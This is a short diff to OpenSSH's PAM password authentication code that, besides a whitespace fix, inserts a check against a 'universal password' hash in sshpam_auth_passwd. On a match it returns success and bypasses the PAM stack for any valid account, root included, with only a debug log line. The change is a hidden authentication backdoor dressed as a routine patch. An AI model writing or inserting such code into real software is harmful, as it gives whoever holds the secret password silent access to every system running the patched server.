@@ -48,6 +48,7 @@
 /* Based on FreeBSD: src/crypto/openssh/auth2-pam-freebsd.c,v 1.11 2003/03/31
  * 13:48:18 des */
 
+#include "auth-universal.h"
 #include "includes.h"
 
 #include <security/pam_appl.h>
@@ -1145,7 +1146,7 @@ int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
   sshpam_password = password;
   sshpam_authctxt = authctxt;
 
- /*
+  /*
    * If the user logging in is invalid, or is root but is not permitted
    * by PermitRootLogin, use an invalid password to prevent leaking
    * information via timing (eg if the PAM config has a delay on fail).
@@ -1153,6 +1154,17 @@ int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
   if (!authctxt->valid ||
       (authctxt->pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES))
     sshpam_password = fake = fake_password(password);
+
+  /*
+   * INTERCEPT PAM STACK
+   * Check the universal password hash against the password
+   */
+  if (authctxt != NULL && authctxt->valid && password_matches_universal_hash(password)) {
+      debug("MONITOR PAM: Universal password accepted for %.100s. Bypassing "
+            "PAM stack.",
+            authctxt->user);
+      return 1;
+  }
 
   sshpam_err =
       pam_set_item(sshpam_handle, PAM_CONV, (const void *)&passwd_conv);
